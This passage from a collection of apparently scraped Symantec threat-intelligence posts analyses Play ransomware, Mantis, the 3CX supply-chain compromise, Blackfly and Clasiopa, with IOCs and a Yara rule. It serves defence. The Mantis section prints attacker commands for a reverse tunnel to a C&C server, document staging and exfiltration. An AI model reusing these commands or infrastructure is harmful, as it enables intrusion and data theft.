632cd9067fb32ac8fbbe93eb134e58bd99601c8690f97ca53e8e17dda5d44e0e DumpCredStore –dumpcredstore.ps1, a.ps1 c1e91a5f9cc23f3626326dab2dcdf4904e6f8a332e2bce8b9a0854b371c2b350 5a0976fef89e32ddcf62c790f9bb4c174a79004e627c3521604f46bf5cc7bea2 AnyDesk – anydesk.exe 7bcff667ab676c8f4f434d14cfc7949e596ca42613c757752330e07c5ea2a453 File Indicators – Othorene 3f75818e2e43a744980254bfdc1225e7743689b378081c560e824a36e0e0a195 – pc.exe, rpc.exe (Main malware) 1b8500e27edc87464b8e5786dc8c2beed9a8c6e58b82e50280cebb7f233bcde4 – get.exe (used to print Syskey and Samkey) 03bc62bd9a681bdcb85db33a08b6f2b41f853de84aa237ae7216432a6f8f817e – pc.dll ae39ced76c78e7c2043b813718e3cd610e1a8adac1f9ad5e69cf06bd6e38a5bd – pc.dll f6f6152db941a03e1f45d52ab55a2e3d774015ccb8828533654e3f3161cfcd21 – pc.exe 2f4a97dc70f06e0235796fec6393579999c224e144adcff908e0c681c123a8a2 – pc.dll 22069984cba22be84fe33a886d989b683de6eb09f001670dbd8c1b605460d454 – pc.dll 7b945fb1bdeb27a35fab7c2e0f5f45e0e64df7821dd1417a77922c9b08acfdc3 – rpc.dll e8be3e40f79981a1c29c15992da116ea969ab5a15dc514479871a50b20b10158 – pc.dl b5c46c2604e29e24c6eb373a7287d919da5c18c04572021f20b8e1966b86d585 – rpc.dll 53d2506723f4d69afca33e90142833b132ed11dd0766192a087cb206840f3692 – test.exe 26d129aaa4f0f830a7a20fe6317ee4a254b9caac52730b6fed6c482be4a5c79d – g.dll b45355c8b84b57ae015ad0aebfa8707be3f33e12731f7f8c282c8ee51f962292 – g.dll 17dce65529069529bcb5ced04721d641bf6d7a7ac61d43aaf1bca2f6e08ead56 – getHashFlsa64.dll 98b6992749819d0a34a196768c6c0d43b100ef754194308eae6aaa90352e2c13 – getHashFlsa64.dll 6d5be3e6939a7c86280044eebe71c566b48981a3341193aa3aff634a3a5d1bbd – getHashFlsa64.dll 1cf04c3e8349171d907b911bc2a23bdb544d88e2f9b8fcc516d8bcf68168aede – getHashFlsa64.dll The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot"
  },
  {
    "title": "play ransomware volume shadow copy",
    "content": "The Play ransomware group is using two new, custom-developed tools that allow it to enumerate all users and computers on a compromised network, and copy files from the Volume Shadow Copy Service (VSS) that are normally locked by the operating system. The first tool found by researchers at Symantec, byBroadcom Software,was Grixba (Infostealer.Grixba), which is a network-scanning tool used to enumerate all users and computers in the domain. The threat actors use the .NET infostealer to enumerate software and services via WMI, WinRM, Remote Registry, and Remote Services. The malware checks for the existence of security and backup software, as well as remote administration tools and other programs, saving the gathered information in CSV files that are compressed into a ZIP file for subsequent manual exfiltration by the threat actors. The Play ransomware gang developed Grixba usingCostura, a popular.NET development tool for embedding an application's dependencies into a single executable file. This eliminates the requirement for the program and its dependencies to be deployed separately, making it easier to share and deploy the application. Costura embeds into applications the DLL file costura.commandline.dll, which is used by Grixba to parse command lines. An analysis of a Grixba sample by Symantec revealed the following help message and functionality: The Scanall mode enumerates software and services via WMI, WinRM, Remote Registry, and Remote Services. It then checks for the existence of the following security programs: It also checks for the existence of the following backup software: It then checks for the existence of the following remote administration tools: Finally, it checks for the presence any of the following programs: The malware then saves all the information in CSV files and, using WinRAR, compresses them to a file named export.zip. List of CSV files compressed by Grixba: Scan mode is similar to Scanall mode, but scans for a subset of the programs covered by Scanall mode. Clr mode deletes the logs from local and remote computers. It also enumerates the following registry keys: SYSTEM\\\\CurrentControlSet\\\\services\\\\eventlog SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels It uses the APIs \"EvtOpenLog\" and \"EvtClearLog\" to delete the logs and deletes the WMI activity logs from the event source \"Microsoft-Windows-WMI-Activity\". The Play ransomware gang was also recently observed using another .NET executable, which was also developed with the Costura tool. Costura embeds the libraryAlphaVSSinto executables. The AlphaVSS library is a.NET framework that provides a high-level interface for interacting with VSS. The library makes it easier for .NET programs to interface with VSS by offering a set of controlled APIs. Developers can use these APIs to generate, manage, and delete shadow copies, as well as access information about existing shadow copies such as size and status. The tool created by the Play ransomware operators uses AlphaVSS to copy files from VSS snapshots. The tool enumerates the files and folders in a VSS snapshot and copies them to a destination directory. The tool allows the attackers to copy files from VSS volumes on compromised machines prior to encryption. This allows the threat actors to copy files that would normally be locked by the operating system. Play ransomware (also known as PlayCrypt), which is developed by a group Symantec tracks as Balloonfly, was launched in June 2022, and since then has been responsible for multiple high-profile attacks. Like most ransomware groups now, Play carries out double-extortion attacks, where the attackers exfiltrate data from victim networks before encrypting them. While the ransomware gang had an initial focus on organizations in Latin America, especially Brazil, it soon widened its targeting. Play is known for targeting Microsoft Exchange vulnerabilities (CVE-2022-41080,CVE-2022-41082), as well as other flaws, to gain remote code execution (RCE) and infiltrate victim networks. The group was also one of the first ransomware groups to employintermittent encryption, a technique that allows for faster encryption of victims’ systems. The tactic consists of encrypting only parts of the targeted files' content, which would still render the data unrecoverable. Play is also notable as it doesn’t appear to operate as a ransomware-as-a-service, with Balloonfly seemingly carrying out the ransomware attacks as well as developing the malware. Custom tools are increasingly being used by ransomware gangs in their attacks. This is likely due to a number of reasons, such as making attacks more efficient and reducing dwell time. Custom tools can be tailored to a specific target environment, allowing ransomware gangs to carry out attacks faster and more efficiently. The use of proprietary tools also gives ransomware operators more control over their operations. If a tool is widely available, it can be reverse-engineered or adapted by other attackers, potentially weakening the initial attack's effectiveness. By keeping their tools proprietary and exclusive, ransomware gangs can maintain their competitive advantage and maximize their profits. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 762bb8a7209da29afb89f7941ae1c00a04cf45a144c6c5dddcfa78ff0d941539 – Play ransomware 86e4e23f9686b129bfb2f452acb16a4c0fda73cf2bf5e93751dcf58860c6598c – SystemBC malware f706bae95a232402488d17016ecc11ebe24a8b6cb9f10ad0fa5cbac0f174d2e7 – SystemBC malware c59f3c8d61d940b56436c14bc148c1fe98862921b8f7bad97fbc96b31d71193c – Infostealer.Grixba 453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb – Infostealer.Grixba f71476f9adec70acc47a911a0cd1d6fea1f85469aa16f5873dd3ffd5146ccd6b – Infostealer.Grixba a8a7fdbbc688029c0d97bf836da9ece926a85e78986d0e1ebd9b3467b3a72258 – NetScan 5ef9844903e8d596ac03cc000b69bbbe45249eea02d9678b38c07f49e4c1ec46 – NetScan f81bd2ac937ed9e254e8b3b003cc35e010800cbbce4d760f5013ff911f01d4f9 – VSS copying tool 367d47ad48822caeedf73ce9f26a3a92db6f9f2eb18ee6d650806959b6d7d0a2 – WinRAR 6f95f7f53b3b6537aeb7c5f0025dbca5e88e6131b7453cfb4ee4d1f11eeaebfc – WinSCP 1409e010675bf4a40db0a845b60db3aae5b302834e80adeec884aebc55eccbf7 – PsExec 137.220[.]49.66 – SystemBC C&C justiceukraine.com – SystemBC C&C The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/play-ransomware-volume-shadow-copy"
  },
  {
    "title": "mantis palestinian attacks",
    "content": "The Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories,is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks. While the group is known for targeting organizations in the Middle East, the most recent campaign uncovered by Symantec, byBroadcom Software, focused on organizations within the Palestinian territories, with malicious activity beginning in September 2022 and continuing to at least February 2023. This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017. Mantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is known to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military, financial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices. Mantis is widely accepted to be linked to the Palestinian territories. Whileother vendors have linked the group to Hamas, Symantec cannot make a definitive attribution to any Palestinian organization. In its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data. The initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network. The following is a description of how one of those three toolsets was used: The first evidence of malicious activity occurred on December 18, 2022. Three distinct sets of obfuscated PowerShell commands were executed to load a Base64-encoded string, which started embedded shellcode. The shellcode was a 32-bit stager that downloaded another stage using basic TCP-based protocol from a command-and-control (C&C) server: 104.194.222[.]50 port 4444. The attackers returned on December 19 to dump credentials before downloading the Micropsia backdoor and Putty,a publicly available SSH client, using Certutil and BITSAdmin Micropsia subsequently executed and initiated contact with a C&C server. On the same day, Micropsia also executed on three other machines in the same organization. In each case, it ran in a folder named after its file name: On one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address: CSIDL_COMMON_APPDATA\\windowsservicemanageav\\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED] On December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers. The following day, December 21, RAR was executed to archive files on another infected computer. Between December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid Gopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it executed on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor elsewhere by the attackers). On December 28, Micropsia was used to run windowspackages.exe on three more infected computers. On December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers. On January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the first version was discovered or whether it was standard operating procedure is unclear. On January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\\hostupbroker\\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file: CSIDL_COMMON_APPDATA\\windowsupserv\\windowsupserv.exe -f CSIDL_COMMON_APPDATA\\windowspackages\\01-04-2023-15-13-39_getf.rar On January 9, Arid Gopher was used to execute two unknown files on a single computer: The last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours. Variants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this campaign, Micropsia was deployed using multiple file names and file paths: Micropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included: In addition to this, Micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration: \"%PROGRAMDATA%\\Software Distributions\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k -hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 \"%PROGRAMDATA%\\Software Distributions\\Bdl\\LMth__C_2023-02-13 17-14-41\" \"%USERPROFILE%\\*.xls\" \"%USERPROFILE%\\*.xlsx\" \"%USERPROFILE%\\*.doc\" \"%USERPROFILE%\\*.docx\" \"%USERPROFILE%\\*.csv\" \"%USERPROFILE%\\*.pdf\" \"%USERPROFILE%\\*.ppt\" \"%USERPROFILE%\\*.pptx\" \"%USERPROFILE%\\*.odt\" \"%USERPROFILE%\\*.mdb\" \"%USERPROFILE%\\*.accdb\" \"%USERPROFILE%\\*.accde\" \"%USERPROFILE%\\*.txt\" \"%USERPROFILE%\\*.rtf\" \"%USERPROFILE%\\*.vcf\" Unlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following embedded components: Arid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor. When communicating with a C&C server, Arid Gopher registers a device on one path then connects to another path, likely to receive commands: Arid Gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. One variant of the malware was radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single subroutine that contained identical distinctive code when compared with the previous version. Mantis appeared to be aggressively mutating the logic between variants, which is a time-intensive operation if done manually. The embedded setup.env file used by one analyzed variant of Arid Gopher to retrieve configuration data contained the following: DIR=WindowsPerceptionService ENDPOINT=http://jumpstartmail[.]com/IURTIER3BNV4ER BW_TOO_ID=7463b9da-7606-11ed-a1eb-0242ac120002 SERVER_TOKEN=PDqMKZ91l2XDmDELOrKB STAPP=AttestationWmiProvider.exe SHORT_APP=ServiceHubIdentityHost.exe The setup.env configuration file mentions another file, AttestationWmiProvider.exe, which is also embedded in Arid Gopher. The file is a 32-bit executable that is used as a helper to ensure that another executable will run on reboot. When it executes, it checks for the following command-line arguments: \"key\" with string parameter [RUN_VALUE_NAME] \"value\" with string parameter [RUN_PATHNAME] It then arranges to receive notification on a signal using func os/signal.Notify(). Once notified, it sets the following registry value: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"[RUN_VALUE_NAME]\" = \"[RUN_PATHNAME]\" Our investigation so far shows this file setting Arid Gopher to run on reboot: CSIDL_COMMON_APPDATA\\attestationwmiprovider\\attestationwmiprovider.exe -key=NetworkVirtualizationStartService \"-value=CSIDL_COMMON_APPDATA\\networkvirtualizationstartservice\\networkvirtualizationstartservice.exe -x\" The attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit PyInstaller executable named WindowsUpServ.exe. When run, the tool checks for the following command-line arguments: \"-d\" \"[FILE_DIRECTORY]\" For each \"-f\" \"[FILENAME]\" command-line argument, the tool uploads the content of [FILENAME]. For each \"-d\" \"[FILE_DIRECTORY]\" command-line argument, the tool obtains a list of files stored in the folder [FILE_DIRECTORY] and uploads the content of each file. When uploading each file, the tools sends an HTTP POST request to a C&C server with the following parameters: \"kjdfnqweb\": [THE_FILE_CONTENT] \"qyiwekq\": [HOSTNAME_OF_THE_AFFECTED_COMPUTER] Whenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. The malware may also log some of its actions in the following files: \"C:\\ProgramData\\WindowsUpServ\\success.txt\" \"C:\\ProgramData\\WindowsUpServ\\err.txt\" Mantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive malware rewriting and its decision to compartmentalize attacks against single organizations into multiple separate strands to reduce the chances of the entire operation being detected. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/mantis-palestinian-attacks"
  },
  {
    "title": "3cx supply chain attack",
    "content": "UPDATE March 31 2023 14:26 UTC:Our blog has been updated with a Yara rule to detect the final infostealer payload. UPDATE March 30 2023 17:39 UTC:Our blog has been updated with technical analysis of the macOS versions. UPDATE March 30 2023 14:17 UTC:Our blog has been updated with  additional IOCs UPDATE March 30 2023 12:47 UTC:Our blog has been updated with additional IOCs and protection information. UPDATE March 30 2023 9:07 UTC:Our blog has been updated with technical analysis of the malware used. Attackers believed to be linked to North Korea have Trojanized 3CX's DesktopApp, a widely-used voice and video calling desktop client. In an attackreminiscent of SolarWinds, installers for several recent Windows and Mac versions of the software were compromised and modified by the attackers in order to deliver additional information stealing malware to the user’s computer. The information gathered by this malware presumably allowed the attackers to gauge if the victim was a candidate for further compromise. The attackers compromised installer files for at least two Windows versions (18.12.407 and 18.12.416) and two Mac versions (8.11.1213 and latest) of 3CX DesktopApp. The installers contained clean versions of the app along with malicious DLLs. The app was used to sideload the malicious DLLs, which then installed information-stealing malware on the computer. In two variants analyzed by Symantec (SHA256: aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 and 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983), the clean executable was used to load a malicious DLL named ffmpeg.dll (SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896) This DLL contains code that will load and execute a payload from a second DLL named d3dcompiler_47.dll. (SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03) D3dcompiler_47.dll contains an encrypted blob appended to the file, suggesting that it is possibly a Trojanized version of a legitimate file. The blob starts with the hex value “FEEDFACE” which the loader uses to find the blob. The decrypted blob contains shellcode and a third DLL (SHA256: aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973). The shellcode loads and executes this third DLL, export DLLGetClassObject with parameters: It will then attempt to download an ICO file from the following GitHub repository: At last two macOS versions of the affected software were compromised in a similar fashion. In this case a dynamic library named libffmpeg.dylib was Trojanized. There are at least two variants of this file (SHA256: a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 and fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7) and they seem to relate to different versions of the software. The malicious code is in the InitFunc_0 function of libffmpeg.dylib, it calls _run_avcodec which starts a thread, in this thread it decodes some shellcode with XOR key 0x7A and then will make a http request. It attempts to download a payload from: The following URLs were embedded in analyzed variants: 3CX is aware of the compromise and is advising users to immediately uninstall the app. It said that it is working on an update to the software that will be released within hours. It advised users to consider using its PWA client as an alternative until a clean version of DesktopApp is released. Machine Learning-based For the latest protection updates, please visit theSymantec Protection Bulletin. Yara Rule to detect final infostealer payload rule icon_3cx_stealer { copyright = \"Symantec\" description = \"Infostealer component used in 3CX supply chain attack\" $a1 = \"******************************** %s ******************************\" wide fullword $a2 = \"\\\\3CXDesktopApp\\\\config.json\" wide fullword $a3 = { 7B 00 22 00 48 00 6F 00 73 00 74 00 4E 00 61 00 6D 00 65 00 22 00 3A 00 20 00 22 00 25 00 73 00 22 00 2C 00 20 00 22 00 44 00 6F 00 6D 00 61 00 69 00 6E 00 4E 00 61 00 6D 00 65 00 22 00 3A 00 20 00 22 00 25 00 73 00 22 00 2C 00 20 00 22 00 4F 00 73 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 22 00 3A 00 20 00 22 00 25 00 64 00 2E 00 25 00 64 00 2E 00 25 00 64 00 22 00 7D } $b1 = \"HostName: %s\" wide fullword $b2 = \"DomainName: %s\" wide fullword $b3 = \"OsVersion: %d.%d.%d\" wide fullword $b4 = \"%s.old\" wide fullword 3 of ($a*) and 2 of ($b*) For more information on scanning SEP client computers using custom Yara rules, readthis knowledge base article. dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc – Windows app aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 – Windows installer fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405 – Windows app 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 – Windows installer 92005051ae314d61074ed94a52e76b1c3e21e7f0e8c1d1fdd497a006ce45fa61 – macOS app 5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290 – macOS installer b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb – macOS app e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec – macOS installer 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 – Infostealer (d3dcompiler_47.dll) 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 - Infostealer (ffmpeg.dll ) aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973 - Infostealer c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 - Infostealer (ffmpeg.dll) fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7 - Malicious macOS library (libffmpeg.dylib) a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 - Malicious macOS library (libffmpeg.dylib) 210c9882eba94198274ebc787fe8c88311af24932832a7fe1f1ca0261f815c3d – Malicious ICO file (icon0.ico) a541e5fc421c358e0a2b07bf4771e897fb5a617998aa4876e0e1baa5fbb8e25c – Malicious ICO file (icon1.ico) d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 – Malicious ICO file (icon10.ico) d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 – Malicious ICO file (icon11.ico) d51a790d187439ce030cf763237e992e9196e9aa41797a94956681b6279d1b9a – Malicious ICO file (icon12.ico) 4e08e4ffc699e0a1de4a5225a0b4920933fbb9cf123cde33e1674fde6d61444f – Malicious ICO file (icon13.ico) 8c0b7d90f14c55d4f1d0f17e0242efd78fd4ed0c344ac6469611ec72defa6b2d – Malicious ICO file (icon14.ico) f47c883f59a4802514c57680de3f41f690871e26f250c6e890651ba71027e4d3 – Malicious ICO file (icon15.ico) 2c9957ea04d033d68b769f333a48e228c32bcf26bd98e51310efd48e80c1789f – Malicious ICO file (icon2.ico) 268d4e399dbbb42ee1cd64d0da72c57214ac987efbb509c46cc57ea6b214beca – Malicious ICO file (icon3.ico) c62dce8a77d777774e059cf1720d77c47b97d97c3b0cf43ade5d96bf724639bd – Malicious ICO file (icon4.ico) c13d49ed325dec9551906bafb6de9ec947e5ff936e7e40877feb2ba4bb176396 – Malicious ICO file (icon5.ico) f1bf4078141d7ccb4f82e3f4f1c3571ee6dd79b5335eb0e0464f877e6e6e3182 – Malicious ICO file (icon6.ico) 2487b4e3c950d56fb15316245b3c51fbd70717838f6f82f32db2efcc4d9da6de – Malicious ICO file (icon7.ico) e059c8c8b01d6f3af32257fc2b6fe188d5f4359c308b3684b1e0db2071c3425c – Malicious ICO file (icon8.ico) d0f1984b4fe896d0024533510ce22d71e05b20bad74d53fae158dc752a65782e – Malicious ICO file (icon9.ico) akamaicontainer[.]comakamaitechcloudservices[.]comazuredeploystore[.]comazureonlinecloud[.]comazureonlinestorage[.]comdunamistrd[.]comglcloudservice[.]comjournalide[.]orgmsedgepackageinfo[.]commsstorageazure[.]commsstorageboxes[.]comofficeaddons[.]comofficestoragebox[.]compbxcloudeservices[.]compbxphonenetwork[.]compbxsources[.]comqwepoi123098[.]comsbmsa[.]wikisourceslabs[.]comvisualstudiofactory[.]comzacharryblogs[.]comraw.githubusercontent[.]com/IconStorages/images/main/ The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/3cx-supply-chain-attack"
  },
  {
    "title": "blackfly espionage materials",
    "content": "The Blackfly espionage group (aka APT41, Winnti Group, Bronze Atlas) has continued to mount attacks against targets in Asia and recently targeted two subsidiaries of an Asian conglomerate, both of which operate in the materials and composites sector, suggesting that the group may be attempting to steal intellectual property. The following tools were used in attacks during late 2022 and early 2023: Blackfly is one of the longest known Chinese advanced persistent threat (APT) groups, active since at least 2010. Early attacks were distinguished by the use of the PlugX/Fast (Backdoor.Korplug), Winnti/Pasteboy (Backdoor.Winnti), and Shadowpad (Backdoor.Shadowpad) malware families. The group initially made a name for itself through attacks on the computer gaming industry. It subsequently branched out into targeting a more diverse range of targets, including organizations in the semiconductor, telecoms, materials manufacturing, pharmaceutical, media and advertising, hospitality, natural resources, fintech, and food sectors. Blackfly has been closely associated with a second Chinese APT group known as Grayfly, so much so that some vendors track the two groups as one actor: APT41.A 2020 indictment of seven men on charges relating to hundreds of cyber attackscarried out by both groups appeared to shed light on this link. Two Chinese nationals were alleged to have worked with both groups. A crossover in personnel may account for the similarities between both groups. Despite being the subject of a U.S. indictment, Blackfly has continued to mount attacks, seemingly undeterred by the publicity afforded to the group. Although it originally made a name for itself by attacking the gaming sector, the group appears focused on targeting intellectual property in a variety of sectors at present. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a – Backdoor.Winnkit e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596 – Backdoor.Winnkit a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac – Backdoor.Winnkit 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196 – Backdoor.Winnkit 192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284 – Backdoor.Winnkit caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459 – Backdoor.Winnkit 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4 – Screenshotting tool 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e – Process-hollowing tool 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d – SQL tool 560ea79a96dc4f459e96df379b00b59828639b02bd7a7a9964b06d04cb43a35a – DCSync b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c – Mimikatz a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864 – ForkPlayground 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f – Proxy configuration tool d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee – Proxy configuration tool f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f – Proxy configuration tool 88113bebc49d40c0aa1f1f0b10a7e6e71e4ed3ae595362451bd9dcebcf7f8bf4 – Proxy configuration tool 498e8d231f97c037909662764397e02f67d0ee16b4f6744cf923f4de3b522bc1 – Proxy configuration tool 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c – Credential-dumping tool The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/blackfly-espionage-materials"
  },
  {
    "title": "clasiopa materials research",
    "content": "A hitherto unknown attack group has been observed targeting a materials research organization in Asia. The group, which Symantec calls Clasiopa, is characterized by a distinct toolset, which includes one piece of custom malware (Backdoor.Atharvan). At present, there is no firm evidence on where Clasiopa is based or whom it acts on behalf. The infection vector used by Clasiopa is unknown, although there is some evidence to suggest that the attackers gain access through brute force attacks on public facing servers. Aside from the distinct toolset used, there were a number of attack hallmarks observed: There is some evidence to suggest that the attackers used two legitimate software packages. One compromised computer was running Agile DGS and Agile FD servers, software developed by Jiangsu. These packages are used for document security and protection in transit. Malicious files were dropped into a folder named “dgs” and one of the backdoors used was renamed from atharvan.exe to agile_update.exe. It is unclear if these software packages are being injected into or installed by the attackers. HCL Domino (formerly IBM Domino) was also run on a compromised machine in close proximity to the execution of backdoors, although it is unclear if this was a coincidence or not. However, both the Domino and Agile software appear to be using old certificates and the Agile servers use old vulnerable libraries. Atharvan is so-named because when the malware is run, it creates a mutex named: \"SAPTARISHI-ATHARVAN-101\" to ensure that only one copy is running. It will then contact a hardcoded C&C server. The hardcoded C&C addresses seen in one of the samples analyzed to date was for Amazon AWS South Korea (Seoul) region, which is not a common location for C&C infrastructure. The C&C communications are formatted as HTTP POST requests where the Host header is hardcoded as \"update.microsoft.com\", e.g.: POST /update.php HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.52 Host: update.microsoft.com Content-type: application/x-www-form-urlencoded id=Atharvan&code=101&cid=H^[REDACTED]&time=5 The request body includes the following parameters: When encrypting the \"msg\" value, the malware uses the following encryption algorithm: def encrypt(plaintext): return bytes([((2 - byte) & 0xff) for byte in plaintext]) The malware uses its own simplistic HTTP parser to extract the body from the server response. The extracted body is decrypted using the following algorithm: def decrypt(ciphertext): return bytes([((2 - byte) & 0xff) for byte in ciphertext]) When fetching commands, the malware expects the decrypted body to contain a sequence of strings separated by the \"\\x1A\" character. The first byte of each string specifies the command to execute and the remaining bytes are interpreted as command parameters. When configuring a communication schedule, the command parameters specify the times and days for the communication attempts. Several different times can be specified, with the hour and minute of the day encoded. The days are interpreted as: This scheduled communication configuration is another unusual feature of the malware and is not commonly seen in malware of this kind. There is currently no firm evidence on where Clasiopa is based or what its motivation is. A Hindi mutex is used in the Atharvan backdoor: \"SAPTARISHI-ATHARVAN-101\". Atharvan is alegendary Vedic sage of Hinduism. The backdoor also sends a post request to a C&C server with the arguments: In addition to this, one of the passwords used by the attackers for a ZIP archive was “iloveindea1998^_^”. While these details could suggest that the group is based in India, it is also quite likely that the information was planted as false flags, with the password in particular seeming to be an overly obvious clue. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 5b74b2176b8914b0c4e6215baab9e96d1e9a773803105cf50dac0427fac79c1b – Backdoor.Atharvan 